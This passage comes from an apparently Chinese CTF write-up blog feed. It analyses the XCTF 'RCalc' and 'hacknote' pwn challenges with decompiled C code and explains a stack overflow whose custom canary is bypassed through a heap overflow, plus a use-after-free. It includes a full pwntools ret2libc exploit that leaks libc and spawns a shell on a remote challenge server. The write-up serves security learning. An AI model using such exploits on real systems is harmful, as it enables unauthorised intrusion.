class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400A06();</span><br><span class="line">  alarm(<span class="number">0x78</span>u);</span><br><span class="line">  sub_400FA2();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_400A06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  qword_6020F8 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F8 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  qword_6020F0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  *qword_6020F8 = <span class="number">0LL</span>;</span><br><span class="line">  v0 = qword_6020F8;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  *qword_6020F0 = <span class="number">0LL</span>;</span><br><span class="line">  v1 = qword_6020F0;</span><br><span class="line">  result = <span class="built_in">malloc</span>(<span class="number">0x320</span>uLL);</span><br><span class="line">  *(v1 + <span class="number">8</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到题目创建了几个chunk但是，注意一下chunk的创建顺序和结构就好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400FA2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_400AAB();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your name pls: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\nWelcome to RCTF 2017!!!\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s try our smart calculator&quot;</span>);</span><br><span class="line">  sub_400E72();</span><br><span class="line">  result = sub_400B92();</span><br><span class="line">  <span class="keyword">if</span> ( result != v2 )</span><br><span class="line">    sub_400BD4();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在一个栈溢出就是__isoc99_scanf(“%s”, v1);但是这里存在一个自主实现的canary保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400AAB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ptr; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *qword_6020F0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8LL</span> * *qword_6020F0 - <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">4uLL</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  srand(ptr);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  v0 = v5 &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  v5 = v0 | rand();</span><br><span class="line">  v1 = *(qword_6020F0 + <span class="number">8</span>);</span><br><span class="line">  v2 = (*qword_6020F0)++;</span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = v5;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是这个，可以看到是将随机值放到chunk里面然后放到栈里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400B92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8LL</span> * (*qword_6020F0)-- - <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个拿到canary的值然后比较，自主实现的一个canary。</p><p>我们再看在计算内部函数如果保存结果的话是保存在哪的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400E39</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(qword_6020F8 + <span class="number">8</span>);</span><br><span class="line">  v2 = (*qword_6020F8)++;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到也是保存在chunk里面的，现在画个图基本就可以看出来了</p><p><img src="/images/image-20211226183348933.png" alt="image-20211226183348933"></p><p>上面储存canary的值*(qword_6020F0 + 8)是放在这样一个chunk里面也就是最下面0x300的chunk里面的</p><p>储存计算结果的值是放在*(qword_6020F8 + 8)这个chunk里面也就是0x100</p><p>并且程序没有检测堆溢出，所以我们可以通过堆溢出覆盖掉下面存的canary然后就直接构造ROPgadget</p><p>(需要注意的是不能使用puts_plt和puts_got，存在0x20会出现截断)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./RCalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./RCalc&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">60200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401123</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x00000000004007fe</span></span><br><span class="line">main_addr = <span class="number">0x401036</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your name pls: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rdi)+p64(__libc_start_main_got)+p64(printf_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">one, two</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input 2 integer: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(one), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(two), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Save the result?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x100</span>/<span class="number">0x8</span>)+<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, __libc_start_main_addr)</span><br><span class="line">libc_base = __libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_sh_addr)</span><br><span class="line"><span class="built_in">print</span>(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your name pls: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x100</span>/<span class="number">0x8</span>)+<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;检查保护&quot;&gt;&lt;a href=&quot;#检查保护&quot; class=&quot;headerlink&quot; title=&quot;检查保护&quot;&gt;&lt;/a&gt;检查保护&lt;/h3&gt;&lt;p&gt;今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (&lt;/p&gt;
&lt;p&gt;是真被xctf搞无语了，有时候环境创建不了就</summary>
      
    
    
    
    <category term="pwn-xctf" scheme="https://cv196082.gitee.io/categories/pwn-xctf/"/>
    
    
    <category term="栈溢出" scheme="https://cv196082.gitee.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>hacknote</title>
    <link href="https://cv196082.gitee.io/2021/12/20/hacknote/"/>
    <id>https://cv196082.gitee.io/2021/12/20/hacknote/</id>
    <published>2021-12-20T07:46:40.000Z</published>
    <updated>2021-12-20T07:48:46.468Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img src="/images/image-20211220153008547.png" alt="image-20211220153008547"></p><p>没有开启PIE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048956();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80487D4();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488A5();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      sub_8048646();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048646</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        **(&amp;ptr + i) = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = *(&amp;ptr + i);</span><br><span class="line">        *(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(*(&amp;ptr + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(*(&amp;ptr + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487D4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(*(&amp;ptr + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80488A5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">    (**(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>题目流程很简单，就是一道菜单题目，创建chunk的时候不存在堆溢出，但是释放chunk之后又没有清除指针，很明显的UAF</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>首先随便创建三个chunk，然后再创建一个大小为0x8的chunk，这时候我们可以控制的chunk就是每一次自动创建的chunk，再利用sub_80488A5这个函数即可。题目很简单直接给exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 